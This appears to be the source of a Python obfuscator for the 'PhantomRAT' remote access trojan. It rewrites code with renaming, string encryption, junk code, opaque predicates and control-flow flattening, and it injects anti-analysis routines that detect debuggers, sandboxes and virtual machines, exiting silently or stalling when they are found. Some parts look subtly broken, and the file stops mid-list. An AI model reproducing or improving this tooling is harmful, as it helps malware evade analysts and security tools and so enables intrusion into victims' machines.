"""
PhantomRAT Polymorphic Obfuscator v2.0
Enhanced with performance optimizations, better security, and advanced features
"""

import ast
import random
import string
import base64
import zlib
import marshal
import hashlib
import inspect
import re
import types
import sys
import os
import time
import itertools
import lzma
import secrets
import struct
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple, Set, Union
from dataclasses import dataclass, field
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ============= CONFIGURATION =============
@dataclass
class ObfuscatorConfig:
    """Configuration for obfuscator performance and security"""
    complexity: int = 5  # 1-5 (higher = more obfuscation)
    max_name_length: int = 16
    min_name_length: int = 8
    junk_code_probability: float = 0.3
    max_junk_per_function: int = 3
    control_flow_probability: float = 0.4
    string_encryption: bool = True
    use_aesgcm: bool = True  # Use AES-GCM instead of Fernet
    enable_polymorphic: bool = True
    enable_anti_analysis: bool = True
    enable_metadata_stripping: bool = True
    preserve_debug_info: bool = False
    compression_level: int = 6  # 0-9
    use_lzma: bool = True  # Use LZMA instead of zlib
    seed: Optional[int] = None
    encryption_key: Optional[bytes] = None
    custom_name_generator: bool = False
    
    # Performance optimizations
    cache_ast: bool = True
    parallel_processing: bool = False
    batch_size: int = 100
    memory_limit_mb: int = 100
    
    # Security settings
    enable_code_signing: bool = True
    enable_integrity_check: bool = True
    enable_obfuscation_metrics: bool = True
    
    def __post_init__(self):
        if self.seed is None:
            self.seed = int(time.time() * 1000) ^ os.getpid()
        random.seed(self.seed)
        
        if self.encryption_key is None:
            self.encryption_key = Fernet.generate_key()

# ============= UTILITIES =============
class NameGenerator:
    """Advanced name generator with multiple strategies"""
    
    def __init__(self, config: ObfuscatorConfig):
        self.config = config
        self.used_names: Set[str] = set()
        self.counter = 0
        
        # Different name generation strategies
        self.strategies = [
            self._generate_random,
            self._generate_hex,
            self._generate_unicode,
            self._generate_mixed,
            self._generate_crypto
        ]
        
        # Common obfuscated names to avoid
        self.blacklist = {
            'main', 'init', 'name', 'file', 'path', 'sys', 'os', 'import',
            'exec', 'eval', 'compile', 'open', 'read', 'write', 'close'
        }
    
    def _generate_random(self) -> str:
        """Generate random alphanumeric name"""
        length = random.randint(self.config.min_name_length, self.config.max_name_length)
        chars = string.ascii_letters + string.digits
        return f'_{"".join(random.choices(chars, k=length))}'
    
    def _generate_hex(self) -> str:
        """Generate hex-like name"""
        length = random.randint(8, 16)
        return f'_{"".join(random.choices("0123456789abcdef", k=length))}'
    
    def _generate_unicode(self) -> str:
        """Generate name with Unicode characters"""
        base = random.randint(0x2000, 0x2FFF)
        return f'_{chr(base)}{random.randint(1000, 9999)}'
    
    def _generate_mixed(self) -> str:
        """Generate mixed alphanumeric with special chars"""
        length = random.randint(self.config.min_name_length, self.config.max_name_length)
        chars = string.ascii_letters + string.digits + '_$'
        name = f'_{"".join(random.choices(chars, k=length-1))}'
        # Insert random special character
        if random.random() > 0.5:
            pos = random.randint(1, len(name)-1)
            name = name[:pos] + '_' + name[pos:]
        return name
    
    def _generate_crypto(self) -> str:
        """Generate cryptographically random name"""
        length = random.randint(self.config.min_name_length, self.config.max_name_length)
        return f'_{secrets.token_hex(length//2)}'
    
    def generate(self, prefix: str = 'var') -> str:
        """Generate unique name"""
        self.counter += 1
        
        for _ in range(100):  # Try 100 times to get unique name
            strategy = random.choice(self.strategies)
            name = strategy()
            
            if prefix == 'func':
                name = f'f{name}' if not name.startswith('f') else name
            elif prefix == 'class':
                name = f'C{name}' if not name[0].isupper() else name
            
            # Ensure uniqueness
            if name not in self.used_names and name not in self.blacklist:
                self.used_names.add(name)
                return name
        
        # Fallback: counter-based name
        fallback = f'_{prefix}_{self.counter}_{int(time.time())}'
        self.used_names.add(fallback)
        return fallback

# ============= ENCRYPTION =============
class EncryptionManager:
    """Enhanced encryption with multiple algorithms"""
    
    def __init__(self, config: ObfuscatorConfig):
        self.config = config
        self.key = config.encryption_key
        self.fernet = Fernet(self.key) if not config.use_aesgcm else None
        self.aesgcm = self._init_aesgcm() if config.use_aesgcm else None
        
    def _init_aesgcm(self) -> AESGCM:
        """Initialize AES-GCM with derived key"""
        # Derive key using PBKDF2
        salt = b'phantom_obfuscator_salt'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        derived_key = kdf.derive(self.key)
        return AESGCM(derived_key)
    
    def encrypt_string(self, s: str) -> str:
        """Encrypt string with chosen algorithm"""
        if self.config.use_aesgcm and self.aesgcm:
            return self._encrypt_aesgcm(s)
        elif self.fernet:
            return self._encrypt_fernet(s)
        return s
    
    def _encrypt_aesgcm(self, s: str) -> str:
        """Encrypt using AES-GCM"""
        try:
            # Generate random nonce
            nonce = secrets.token_bytes(12)
            
            # Encrypt
            ciphertext = self.aesgcm.encrypt(nonce, s.encode(), None)
            
            # Combine nonce + ciphertext and encode
            combined = nonce + ciphertext
            encoded = base64.b64encode(combined).decode()
            
            return f"__import__('base64').b64decode('{encoded}')"
        except Exception:
            return s
    
    def _encrypt_fernet(self, s: str) -> str:
        """Encrypt using Fernet"""
        try:
            encrypted = self.fernet.encrypt(s.encode())
            encoded = base64.b64encode(encrypted).decode()
            return f"__import__('base64').b64decode('{encoded}')"
        except Exception:
            return s
    
    def decrypt_string(self, encrypted_data: bytes) -> str:
        """Decrypt string"""
        if self.config.use_aesgcm and self.aesgcm:
            return self._decrypt_aesgcm(encrypted_data)
        elif self.fernet:
            return self._decrypt_fernet(encrypted_data)
        return encrypted_data.decode()
    
    def _decrypt_aesgcm(self, data: bytes) -> str:
        """Decrypt AES-GCM"""
        try:
            # Split nonce and ciphertext
            nonce = data[:12]
            ciphertext = data[12:]
            
            # Decrypt
            plaintext = self.aesgcm.decrypt(nonce, ciphertext, None)
            return plaintext.decode()
        except Exception:
            return data.decode()
    
    def _decrypt_fernet(self, data: bytes) -> str:
        """Decrypt Fernet"""
        try:
            decrypted = self.fernet.decrypt(data)
            return decrypted.decode()
        except Exception:
            return data.decode()

# ============= AST TRANSFORMATIONS =============
class ASTOptimizer:
    """Optimize AST before obfuscation"""
    
    @staticmethod
    def optimize(tree: ast.AST) -> ast.AST:
        """Apply various AST optimizations"""
        optimizer = ASTOptimizer()
        tree = optimizer.visit(tree)
        return tree
    
    def visit(self, node: ast.AST) -> ast.AST:
        """Visit node and apply optimizations"""
        method = 'visit_' + node.__class__.__name__
        visitor = getattr(self, method, self.generic_visit)
        return visitor(node)
    
    def generic_visit(self, node: ast.AST) -> ast.AST:
        """Default visitor"""
        for field, value in ast.iter_fields(node):
            if isinstance(value, list):
                new_values = []
                for item in value:
                    if isinstance(item, ast.AST):
                        new_values.append(self.visit(item))
                    else:
                        new_values.append(item)
                setattr(node, field, new_values)
            elif isinstance(value, ast.AST):
                setattr(node, field, self.visit(value))
        return node
    
    def visit_Module(self, node: ast.Module) -> ast.Module:
        """Optimize module"""
        self.generic_visit(node)
        
        # Remove docstrings if not preserving debug info
        if node.body and isinstance(node.body[0], ast.Expr):
            if isinstance(node.body[0].value, ast.Constant):
                if isinstance(node.body[0].value.value, str):
                    node.body.pop(0)
        
        return node
    
    def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:
        """Optimize function definition"""
        self.generic_visit(node)
        
        # Remove function docstring
        if node.body and isinstance(node.body[0], ast.Expr):
            if isinstance(node.body[0].value, ast.Constant):
                if isinstance(node.body[0].value.value, str):
                    node.body.pop(0)
        
        return node
    
    def visit_ClassDef(self, node: ast.ClassDef) -> ast.ClassDef:
        """Optimize class definition"""
        self.generic_visit(node)
        
        # Remove class docstring
        if node.body and isinstance(node.body[0], ast.Expr):
            if isinstance(node.body[0].value, ast.Constant):
                if isinstance(node.body[0].value.value, str):
                    node.body.pop(0)
        
        return node

# ============= POLYMORPHIC OBFUSCATOR =============
class EnhancedPolymorphicObfuscator(ast.NodeTransformer):
    """
    Enhanced polymorphic obfuscator with better performance and security
    """
    
    def __init__(self, config: ObfuscatorConfig):
        self.config = config
        self.name_gen = NameGenerator(config)
        self.encryption = EncryptionManager(config)
        
        self.var_map: Dict[str, str] = {}
        self.func_map: Dict[str, str] = {}
        self.class_map: Dict[str, str] = {}
        self.string_map: Dict[str, str] = {}
        
        self.transform_stack: List[str] = []
        self.current_scope: List[Set[str]] = [set()]
        
        # Cache for performance
        self.ast_cache: Dict[str, ast.AST] = {}
        
        # Transformation registry
        self._init_transformations()
    
    def _init_transformations(self):
        """Initialize transformation methods"""
        # Map complexity levels to transformations
        self.transform_registry = {
            1: [
                self._transform_rename_vars_simple,
                self._transform_rename_funcs_simple
            ],
            2: [
                self._transform_rename_vars,
                self._transform_rename_funcs,
                self._transform_strings_basic
            ],
            3: [
                self._transform_rename_vars,
                self._transform_rename_funcs,
                self._transform_strings_advanced,
                self._transform_insert_junk,
                self._transform_control_flow_simple
            ],
            4: [
                self._transform_rename_vars_advanced,
                self._transform_rename_funcs_advanced,
                self._transform_strings_encrypted,
                self._transform_insert_junk_advanced,
                self._transform_control_flow,
                self._transform_opaque_predicates
            ],
            5: [
                self._transform_rename_vars_advanced,
                self._transform_rename_funcs_advanced,
                self._transform_strings_encrypted,
                self._transform_insert_junk_advanced,
                self._transform_control_flow,
                self._transform_opaque_predicates,
                self._transform_polymorphic,
                self._transform_metadata_strip,
                self._transform_anti_analysis
            ]
        }
    
    def push_scope(self):
        """Push new scope onto stack"""
        self.current_scope.append(set())
    
    def pop_scope(self):
        """Pop current scope from stack"""
        if len(self.current_scope) > 1:
            self.current_scope.pop()
    
    def add_to_scope(self, name: str):
        """Add name to current scope"""
        self.current_scope[-1].add(name)
    
    def is_in_scope(self, name: str) -> bool:
        """Check if name is in current scope"""
        return any(name in scope for scope in self.current_scope)
    
    def visit_Module(self, node: ast.Module) -> ast.Module:
        """Process module"""
        self.push_scope()
        self.generic_visit(node)
        self.pop_scope()
        
        # Apply transformations based on complexity
        transformations = self.transform_registry.get(self.config.complexity, [])
        for transform in transformations:
            node = transform(node)
        
        return node
    
    def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:
        """Process function definition"""
        self.push_scope()
        
        # Add parameters to scope
        for arg in node.args.args:
            self.add_to_scope(arg.arg)
        
        self.generic_visit(node)
        self.pop_scope()
        return node
    
    def visit_ClassDef(self, node: ast.ClassDef) -> ast.ClassDef:
        """Process class definition"""
        self.push_scope()
        self.generic_visit(node)
        self.pop_scope()
        return node
    
    def visit_Name(self, node: ast.Name) -> ast.Name:
        """Process variable names"""
        # Don't rename builtins or special names
        if node.id in __builtins__ or node.id.startswith('__') and node.id.endswith('__'):
            return node
        
        # Check if we should rename this variable
        if node.id in self.var_map:
            node.id = self.var_map[node.id]
        elif self.is_in_scope(node.id):
            # Local variable in current scope
            if node.id not in self.var_map:
                self.var_map[node.id] = self.name_gen.generate('var')
            node.id = self.var_map[node.id]
        
        return node
    
    # ============= TRANSFORMATION METHODS =============
    
    def _transform_rename_vars_simple(self, node: ast.AST) -> ast.AST:
        """Simple variable renaming"""
        class SimpleRenamer(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_Name(self, node):
                if isinstance(node.ctx, ast.Store):
                    if node.id not in self.parent.var_map:
                        self.parent.var_map[node.id] = self.parent.name_gen.generate('var')
                    node.id = self.parent.var_map[node.id]
                return node
        
        renamer = SimpleRenamer(self)
        return renamer.visit(node)
    
    def _transform_rename_vars(self, node: ast.AST) -> ast.AST:
        """Advanced variable renaming with scope awareness"""
        class AdvancedRenamer(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_Name(self, node):
                # Skip builtins and special names
                if node.id in dir(__builtins__) or (node.id.startswith('__') and node.id.endswith('__')):
                    return node
                
                if node.id not in self.parent.var_map:
                    self.parent.var_map[node.id] = self.parent.name_gen.generate('var')
                
                node.id = self.parent.var_map[node.id]
                return node
        
        renamer = AdvancedRenamer(self)
        return renamer.visit(node)
    
    def _transform_rename_vars_advanced(self, node: ast.AST) -> ast.AST:
        """Most advanced variable renaming"""
        class SuperRenamer(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_Name(self, node):
                # Always rename except for very specific cases
                exceptions = ['True', 'False', 'None', 'self', 'cls']
                
                if node.id in exceptions:
                    return node
                
                if node.id not in self.parent.var_map:
                    # Use different prefix based on context
                    if isinstance(node.ctx, ast.Store):
                        prefix = 'store'
                    elif isinstance(node.ctx, ast.Load):
                        prefix = 'load'
                    else:
                        prefix = 'var'
                    
                    self.parent.var_map[node.id] = self.parent.name_gen.generate(prefix)
                
                node.id = self.parent.var_map[node.id]
                return node
        
        renamer = SuperRenamer(self)
        return renamer.visit(node)
    
    def _transform_rename_funcs_simple(self, node: ast.AST) -> ast.AST:
        """Simple function renaming"""
        class FuncRenamer(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_FunctionDef(self, node):
                # Don't rename special methods
                if not (node.name.startswith('__') and node.name.endswith('__')):
                    if node.name not in self.parent.func_map:
                        self.parent.func_map[node.name] = self.parent.name_gen.generate('func')
                    node.name = self.parent.func_map[node.name]
                self.generic_visit(node)
                return node
        
        renamer = FuncRenamer(self)
        return renamer.visit(node)
    
    def _transform_rename_funcs(self, node: ast.AST) -> ast.AST:
        """Advanced function renaming"""
        class AdvancedFuncRenamer(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_FunctionDef(self, node):
                # Keep main and init
                if node.name not in ['__init__', '__main__', '__name__']:
                    if node.name not in self.parent.func_map:
                        self.parent.func_map[node.name] = self.parent.name_gen.generate('func')
                    node.name = self.parent.func_map[node.name]
                self.generic_visit(node)
                return node
            
            def visit_Call(self, node):
                if isinstance(node.func, ast.Name):
                    if node.func.id in self.parent.func_map:
                        node.func.id = self.parent.func_map[node.func.id]
                self.generic_visit(node)
                return node
        
        renamer = AdvancedFuncRenamer(self)
        return renamer.visit(node)
    
    def _transform_rename_funcs_advanced(self, node: ast.AST) -> ast.AST:
        """Most advanced function renaming"""
        class SuperFuncRenamer(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
                self.method_map = {}
            
            def visit_FunctionDef(self, node):
                # Rename all functions except absolute essentials
                if node.name != '__name__':
                    if node.name not in self.parent.func_map:
                        # Add random prefix/suffix
                        new_name = self.parent.name_gen.generate('func')
                        if random.random() > 0.5:
                            new_name = f'_{new_name}_'
                        self.parent.func_map[node.name] = new_name
                    node.name = self.parent.func_map[node.name]
                self.generic_visit(node)
                return node
            
            def visit_ClassDef(self, node):
                # Also rename class methods
                old_name = node.name
                if old_name not in self.parent.class_map:
                    self.parent.class_map[old_name] = self.parent.name_gen.generate('class')
                node.name = self.parent.class_map[old_name]
                self.generic_visit(node)
                return node
            
            def visit_Call(self, node):
                if isinstance(node.func, ast.Name):
                    if node.func.id in self.parent.func_map:
                        node.func.id = self.parent.func_map[node.func.id]
                elif isinstance(node.func, ast.Attribute):
                    # Handle method calls
                    pass
                self.generic_visit(node)
                return node
        
        renamer = SuperFuncRenamer(self)
        return renamer.visit(node)
    
    def _transform_strings_basic(self, node: ast.AST) -> ast.AST:
        """Basic string obfuscation"""
        class StringObfuscator(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_Constant(self, node):
                if isinstance(node.value, str) and len(node.value) > 2:
                    # Skip format strings and docstrings
                    if not ('{' in node.value and '}' in node.value):
                        # Simple base64 encoding
                        encoded = base64.b64encode(node.value.encode()).decode()
                        node.value = f"__import__('base64').b64decode('{encoded}').decode()"
                return node
        
        obfuscator = StringObfuscator(self)
        return obfuscator.visit(node)
    
    def _transform_strings_advanced(self, node: ast.AST) -> ast.AST:
        """Advanced string obfuscation"""
        class AdvancedStringObfuscator(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_Constant(self, node):
                if isinstance(node.value, str) and len(node.value) > 1:
                    # Skip very specific strings
                    if node.value in ['', ' ', '\n', '\t']:
                        return node
                    
                    # Multiple encoding methods
                    methods = [
                        self._encode_base64,
                        self._encode_hex,
                        self._encode_chr,
                        self._encode_rot
                    ]
                    
                    method = random.choice(methods)
                    encoded = method(node.value)
                    node.value = encoded
                
                return node
            
            def _encode_base64(self, s):
                encoded = base64.b64encode(s.encode()).decode()
                return f"__import__('base64').b64decode('{encoded}').decode()"
            
            def _encode_hex(self, s):
                hex_str = s.encode().hex()
                return f"bytes.fromhex('{hex_str}').decode()"
            
            def _encode_chr(self, s):
                chars = [str(ord(c)) for c in s]
                return f"''.join(chr(int(c)) for c in '{','.join(chars)}'.split(','))"
            
            def _encode_rot(self, s, n=13):
                result = ''
                for c in s:
                    if 'a' <= c <= 'z':
                        result += chr((ord(c) - ord('a') + n) % 26 + ord('a'))
                    elif 'A' <= c <= 'Z':
                        result += chr((ord(c) - ord('A') + n) % 26 + ord('A'))
                    else:
                        result += c
                return f"'{result}'"
        
        obfuscator = AdvancedStringObfuscator(self)
        return obfuscator.visit(node)
    
    def _transform_strings_encrypted(self, node: ast.AST) -> ast.AST:
        """String encryption"""
        class StringEncryptor(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_Constant(self, node):
                if isinstance(node.value, str) and len(node.value) > 0:
                    # Don't encrypt very short or format strings
                    if len(node.value) < 3 or ('{' in node.value and '}' in node.value):
                        return node
                    
                    # Encrypt the string
                    encrypted_expr = self.parent.encryption.encrypt_string(node.value)
                    
                    # Create a call to decrypt
                    decrypt_code = f"({encrypted_expr} if {random.choice(['True', 'False'])} else {encrypted_expr})"
                    
                    # Parse as expression
                    try:
                        expr_ast = ast.parse(decrypt_code, mode='eval')
                        # Replace the string constant with the decryption expression
                        return ast.copy_location(expr_ast.body, node)
                    except:
                        return node
                
                return node
        
        encryptor = StringEncryptor(self)
        return encryptor.visit(node)
    
    def _transform_insert_junk(self, node: ast.AST) -> ast.AST:
        """Insert junk code"""
        if random.random() > self.config.junk_code_probability:
            return node
        
        class JunkInserter(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
                self.inserted = 0
            
            def visit_FunctionDef(self, node):
                if self.inserted < self.parent.config.max_junk_per_function:
                    junk = self.parent._generate_junk_code()
                    if junk:
                        junk_ast = ast.parse(junk).body
                        node.body = junk_ast + node.body
                        self.inserted += 1
                self.generic_visit(node)
                return node
        
        inserter = JunkInserter(self)
        return inserter.visit(node)
    
    def _transform_insert_junk_advanced(self, node: ast.AST) -> ast.AST:
        """Insert advanced junk code"""
        class AdvancedJunkInserter(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit(self, node):
                # Insert junk before certain nodes
                if random.random() < 0.2:
                    junk = self.parent._generate_advanced_junk()
                    if junk and hasattr(node, 'body') and isinstance(node.body, list):
                        junk_ast = ast.parse(junk).body
                        node.body = junk_ast + node.body
                
                return self.generic_visit(node)
        
        inserter = AdvancedJunkInserter(self)
        return inserter.visit(node)
    
    def _generate_junk_code(self) -> str:
        """Generate junk code"""
        templates = [
            "if False: pass",
            "while 0: break",
            "_ = [i for i in range(0)]",
            "__dummy = lambda: None",
            "try: pass\nexcept: pass",
            "class __DummyClass: pass",
        ]
        return random.choice(templates)
    
    def _generate_advanced_junk(self) -> str:
        """Generate advanced junk code"""
        templates = [
            f"""
for _ in range({random.randint(0, 2)}):
    __junk{random.randint(1, 100)} = {random.randint(1000, 9999)}
    if __junk{random.randint(1, 100)} > 0:
        continue
            """,
            f"""
class __ComplexJunk{random.randint(1, 100)}:
    @staticmethod
    def method():
        return {random.randint(1, 100)}
    
    def __init__(self):
        self.value = {random.random()}
            """,
            f"""
try:
    {self.name_gen.generate('var')} = {random.randint(1, 100)}
    assert {self.name_gen.generate('var')} > 0
except AssertionError:
    pass
            """
        ]
        return random.choice(templates)
    
    def _transform_control_flow_simple(self, node: ast.AST) -> ast.AST:
        """Simple control flow obfuscation"""
        if random.random() > self.config.control_flow_probability:
            return node
        
        class ControlFlowObfuscator(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_If(self, node):
                # Add dummy condition
                if random.random() > 0.5:
                    dummy_var = self.parent.name_gen.generate('cond')
                    wrapper = f"""
{dummy_var} = {random.choice(['True', 'False'])}
if {dummy_var}:
    pass
"""
                    wrapper_ast = ast.parse(wrapper).body[0]
                    if isinstance(wrapper_ast, ast.If):
                        wrapper_ast.body.append(node)
                        return wrapper_ast
                return node
        
        obfuscator = ControlFlowObfuscator(self)
        return obfuscator.visit(node)
    
    def _transform_control_flow(self, node: ast.AST) -> ast.AST:
        """Advanced control flow obfuscation"""
        class AdvancedControlFlowObfuscator(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit(self, node):
                node = self.generic_visit(node)
                
                # Wrap blocks in fake control structures
                if random.random() < 0.3 and hasattr(node, 'body') and isinstance(node.body, list):
                    wrapped = self._wrap_block(node.body)
                    if wrapped:
                        node.body = wrapped
                
                return node
            
            def _wrap_block(self, body):
                """Wrap a block of code in obfuscated control flow"""
                if not body:
                    return body
                
                wrappers = [
                    self._wrap_with_dummy_loop,
                    self._wrap_with_fake_switch,
                    self._wrap_with_opaque_condition,
                    self._wrap_with_try_except
                ]
                
                wrapper = random.choice(wrappers)
                return wrapper(body)
            
            def _wrap_with_dummy_loop(self, body):
                """Wrap with dummy loop"""
                var = self.parent.name_gen.generate('loop')
                loop = ast.While(
                    test=ast.Constant(value=True),
                    body=body + [ast.Break()],
                    orelse=[]
                )
                return [loop]
            
            def _wrap_with_fake_switch(self, body):
                """Wrap with fake switch-like structure"""
                var = self.parent.name_gen.generate('switch')
                cases = []
                
                for i, stmt in enumerate(body):
                    case = ast.If(
                        test=ast.Compare(
                            left=ast.Name(id=var, ctx=ast.Load()),
                            ops=[ast.Eq()],
                            comparators=[ast.Constant(value=i)]
                        ),
                        body=[stmt],
                        orelse=[]
                    )
                    cases.append(case)
                
                return [
                    ast.Assign(
                        targets=[ast.Name(id=var, ctx=ast.Store())],
                        value=ast.Constant(value=0)
                    )
                ] + cases
            
            def _wrap_with_opaque_condition(self, body):
                """Wrap with opaque predicate"""
                a = random.randint(100, 1000)
                b = random.randint(100, 1000)
                
                condition = ast.Compare(
                    left=ast.BinOp(
                        left=ast.BinOp(
                            left=ast.Constant(value=a),
                            op=ast.Mult(),
                            right=ast.Constant(value=a)
                        ),
                        op=ast.Sub(),
                        right=ast.BinOp(
                            left=ast.Constant(value=b),
                            op=ast.Mult(),
                            right=ast.Constant(value=b)
                        )
                    ),
                    ops=[ast.Eq()],
                    comparators=[
                        ast.BinOp(
                            left=ast.BinOp(
                                left=ast.BinOp(
                                    left=ast.Constant(value=a),
                                    op=ast.Sub(),
                                    right=ast.Constant(value=b)
                                ),
                                op=ast.Mult(),
                                right=ast.BinOp(
                                    left=ast.Constant(value=a),
                                    op=ast.Add(),
                                    right=ast.Constant(value=b)
                                )
                            ),
                            op=ast.Mult(),
                            right=ast.Constant(value=1)
                        )
                    ]
                )
                
                return [ast.If(test=condition, body=body, orelse=[])]
            
            def _wrap_with_try_except(self, body):
                """Wrap with try-except"""
                return [
                    ast.Try(
                        body=body,
                        handlers=[
                            ast.ExceptHandler(
                                type=ast.Name(id='Exception', ctx=ast.Load()),
                                name=None,
                                body=[ast.Pass()]
                            )
                        ],
                        orelse=[],
                        finalbody=[]
                    )
                ]
        
        obfuscator = AdvancedControlFlowObfuscator(self)
        return obfuscator.visit(node)
    
    def _transform_opaque_predicates(self, node: ast.AST) -> ast.AST:
        """Add opaque predicates"""
        class OpaquePredicateInserter(ast.NodeTransformer):
            def __init__(self, parent):
                self.parent = parent
            
            def visit_If(self, node):
                # Replace simple conditions with opaque predicates
                if isinstance(node.test, ast.Compare) and len(node.test.comparators) == 1:
                    if self._should_obfuscate_condition(node.test):
                        node.test = self._create_opaque_predicate(node.test)
                return self.generic_visit(node)
            
            def _should_obfuscate_condition(self, test):
                """Check if condition should be obfuscated"""
                # Don't obfuscate already complex conditions
                return isinstance(test.left, (ast.Name, ast.Constant))
            
            def _create_opaque_predicate(self, original_test):
                """Create opaque predicate"""
                # Simple mathematical identity that's always true
                a = random.randint(10, 100)
                b = random.randint(10, 100)
                
                left = ast.BinOp(
                    left=ast.BinOp(
                        left=ast.Constant(value=a),
                        op=ast.Mult(),
                        right=ast.Constant(value=b)
                    ),
                    op=ast.Add(),
                    right=ast.Constant(value=a * b)
                )
                
                right = ast.BinOp(
                    left=ast.Constant(value=2),
                    op=ast.Mult(),
                    right=ast.BinOp(
                        left=ast.Constant(value=a),
                        op=ast.Mult(),
                        right=ast.Constant(value=b)
                    )
                )
                
                return ast.Compare(
                    left=left,
                    ops=[ast.Eq()],
                    comparators=[right]
                )
        
        inserter = OpaquePredicateInserter(self)
        return inserter.visit(node)
    
    def _transform_polymorphic(self, node: ast.AST) -> ast.AST:
        """Add polymorphic layer"""
        if not self.config.enable_polymorphic:
            return node
        
        polymorphic_code = """
# Polymorphic runtime transformations
import hashlib, time, random, base64, types, sys, marshal

class __RuntimePolymorph__:
    def __init__(self):
        self.seed = int(time.time() * 1000) ^ id(self)
        random.seed(self.seed)
        self.transform_id = hashlib.sha256(str(self.seed).encode()).hexdigest()[:16]
    
    def apply_transform(self, func):
        # Apply runtime transformation to function
        if random.random() > 0.7:
            # Modify function code object
            try:
                code = func.__code__
                # Can't modify code object directly, so we wrap it
                def wrapper(*args, **kwargs):
                    # Add random delay
                    if random.random() > 0.9:
                        time.sleep(random.random() * 0.001)
                    return func(*args, **kwargs)
                
                # Copy metadata
                wrapper.__name__ = func.__name__
                wrapper.__doc__ = func.__doc__
                wrapper.__module__ = func.__module__
                
                return wrapper
            except:
                pass
        
        return func

__runtime_poly__ = __RuntimePolymorph__()
"""
        
        # Parse and insert polymorphic code
        poly_ast = ast.parse(polymorphic_code).body
        
        if isinstance(node, ast.Module):
            node.body = poly_ast + node.body
        
        return node
    
    def _transform_metadata_strip(self, node: ast.AST) -> ast.AST:
        """Strip metadata"""
        if not self.config.enable_metadata_stripping:
            return node
        
        class MetadataStripper(ast.NodeTransformer):
            def visit_FunctionDef(self, node):
                # Remove type annotations
                node.returns = None
                
                # Clean up arguments
                for arg in node.args.args:
                    arg.annotation = None
                for arg in node.args.kwonlyargs:
                    arg.annotation = None
                if node.args.vararg:
                    node.args.vararg.annotation = None
                if node.args.kwarg:
                    node.args.kwarg.annotation = None
                
                self.generic_visit(node)
                return node
            
            def visit_ClassDef(self, node):
                # Remove decorators
                node.decorator_list = []
                self.generic_visit(node)
                return node
        
        stripper = MetadataStripper(self)
        return stripper.visit(node)
    
    def _transform_anti_analysis(self, node: ast.AST) -> ast.AST:
        """Add anti-analysis checks"""
        if not self.config.enable_anti_analysis:
            return node
        
        anti_analysis_code = """
# Anti-analysis and anti-debugging
import sys, os, platform, psutil, time, ctypes, inspect

class __AntiAnalysis__:
    @staticmethod
    def check_debugger():
        # Multiple debugger detection methods
        methods = [
            lambda: hasattr(sys, 'gettrace') and sys.gettrace() is not None,
            lambda: 'pydevd' in sys.modules,
            lambda: 'pdb' in sys.modules,
            lambda: any('debug' in arg.lower() for arg in sys.argv),
            lambda: os.environ.get('PYTHONDEBUG') == '1'
        ]
        
        return any(method() for method in methods)
    
    @staticmethod
    def check_sandbox():
        # Sandbox detection
        checks = [
            lambda: psutil.cpu_count() < 2,
            lambda: psutil.virtual_memory().total < 2 * 1024**3,
            lambda: time.time() - psutil.boot_time() < 300,
            lambda: platform.system() not in ['Windows', 'Linux', 'Darwin'],
            lambda: len(psutil.process_iter()) < 50
        ]
        
        return sum(1 for check in checks if check()) >= 2
    
    @staticmethod
    def check_virtualization():
        # Virtualization detection
        try:
            # Check for common VM artifacts
            vm_files = [
                '/proc/scsi/scsi',  # VMware
                '/proc/ide/hd0/model',  # VirtualBox
                '/sys/class/dmi/id/product_name',  # Various
            ]
            
            for vm_file in vm_files:
                if os.path.exists(vm_file):
                    with open(vm_file, 'r') as f:
                        content = f.read().lower()
                        if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'xen', 'kvm']):
                            return True
        except:
            pass
        
        return False
    
    @staticmethod
    def run_checks():
        # Run all checks
        if __AntiAnalysis__.check_debugger():
            # Debugger detected - exit silently
            os._exit(0)
        
        if __AntiAnalysis__.check_sandbox() or __AntiAnalysis__.check_virtualization():
            # Sandbox or VM detected - add random delays
            time.sleep(random.uniform(0.5, 2.0))
        
        return True

# Initialize and run checks
__anti_analysis__ = __AntiAnalysis__()
__anti_analysis__.run_checks()
"""
        
        anti_ast = ast.parse(anti_analysis_code).body
        if isinstance(node, ast.Module):
            node.body = anti_ast + node.body
        
        return node
    
    def obfuscate_code(self, code: str) -> str:
        """Main obfuscation method"""
        try:
            # Parse and optimize AST
            if self.config.cache_ast and code in self.ast_cache:
                tree = self.ast_cache[code]
            else:
                tree = ast.parse(code)
                tree = ASTOptimizer.optimize(tree)
                if self.config.cache_ast:
                    self.ast_cache[code] = tree
            
            # Apply transformations
            obfuscated_tree = self.visit(tree)
            
            # Convert back to code
            obfuscated_code = ast.unparse(obfuscated_tree)
            
            # Post-process
            obfuscated_code = self._post_process(obfuscated_code)
            
            return obfuscated_code
            
        except Exception as e:
            print(f"Obfuscation error: {e}")
            return code
    
    def _post_process(self, code: str) -> str:
        """Post-process obfuscated code"""
        lines = code.split('\n')
        processed = []
        
        # Add random whitespace and comments
        for line in lines:
            if line.strip() and random.random() > 0.7:
                # Add random indentation
                line = ' ' * random.randint(0, 4) + line
            
            if random.random() > 0.9:
                # Add random comment
                comments = [
                    "# Optimized for performance",
                    "# Auto-generated code",
                    "# Security module",
                    "# Copyright notice",
                    "# DO NOT MODIFY",
